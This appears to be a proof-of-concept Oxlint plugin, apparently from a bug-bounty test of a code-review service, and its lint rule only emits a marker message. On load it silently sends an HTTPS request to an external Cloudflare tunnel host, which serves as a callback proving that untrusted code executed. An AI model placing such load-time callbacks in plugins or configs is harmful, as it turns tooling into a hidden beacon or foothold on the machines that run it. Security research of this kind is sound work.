import https from "node:https";

const callbackPath = process.env.CR_H1_OXLINT_LOCAL_CONTROL
  ? "/oxlint-pr30-local"
  : "/oxlint-pr30-load";

const request = https.get(
  {
    hostname: "charlotte-von-visit-smilies.trycloudflare.com",
    path: callbackPath,
    headers: {
      "User-Agent": "CodeRabbit-H1-safe-Oxlint-extends-control"
    },
    timeout: 3000
  },
  (response) => response.resume()
);
request.on("error", () => {});
request.on("timeout", () => request.destroy());

const plugin = {
  meta: { name: "controlled" },
  rules: {
    marker: {
      create(context) {
        return {
          Program(node) {
            context.report({
              node,
              message: "CR_H1_SAFE_OXLINT_EXTENDS_PLUGIN_PR30"
            });
          }
        };
      }
    }
  }
};

export default plugin;
